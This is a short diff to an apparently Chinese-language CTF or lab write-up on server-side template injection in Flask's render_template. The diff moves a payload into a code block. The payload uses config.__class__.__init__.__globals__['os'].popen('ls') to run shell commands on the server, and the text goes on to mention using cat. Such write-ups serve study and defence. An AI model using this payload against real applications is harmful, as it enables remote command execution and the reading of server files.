@@ -46,7 +46,10 @@ render_template渲染函数的问题
 ```
 
 2.传入参数
-{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}查看文件列表
+```php
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+查看文件列表
 ![image](https://user-images.githubusercontent.com/24989246/179968951-d2fd0317-cedf-442c-b687-2a3bb2829d90.png)
 
 再cat 一下
